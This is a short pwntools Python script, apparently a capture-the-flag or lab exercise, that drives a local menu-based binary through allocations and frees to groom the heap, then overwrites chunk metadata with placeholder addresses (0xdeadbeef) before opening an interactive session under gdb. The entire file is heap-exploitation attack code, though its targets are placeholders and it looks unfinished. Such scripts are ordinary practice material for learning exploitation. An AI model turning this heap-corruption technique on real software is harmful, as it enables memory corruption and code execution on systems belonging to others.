from pwn import *
elf =context.binary = ELF("./main")
context.log_level ="debug"


io = process()

def malloc(index,size):
  io.sendlineafter(b">>",b"1")
  io.sendlineafter(b">>",str(index))
  io.sendlineafter(b">>",str(size))


def calloc(index,size):
  io.sendlineafter(b">>",b"2")
  io.sendlineafter(b">>",str(index))
  io.sendlineafter(b">>",str(size))

def free(index):
  io.sendlineafter(b">>",b"3")
  io.sendlineafter(b">>",str(index))

def edit(index,payload):
  io.sendlineafter(b">>",b"4")
  io.sendlineafter(b">>",str(index))
  io.sendline(payload)

def view(index):
  io.sendlineafter(b">>",b"5")
  io.sendlineafter(b">>",str(index))

gdb.attach(io)



for i in range(20):
  malloc(i,0x90)

for i in [2,4,6,8,10,12,14]:
  free(i)

for i in [1,3,5,7,9,11,13]:
  free(i)

malloc(21,0xa0)


for i in [2,4,6,8,10,12,14]:
  malloc(i,0x90)

target = 0xdeadbeef
edit(13,pack(0xcafebabe)+pack(target))

malloc(18,0x90)
















io.interactive()
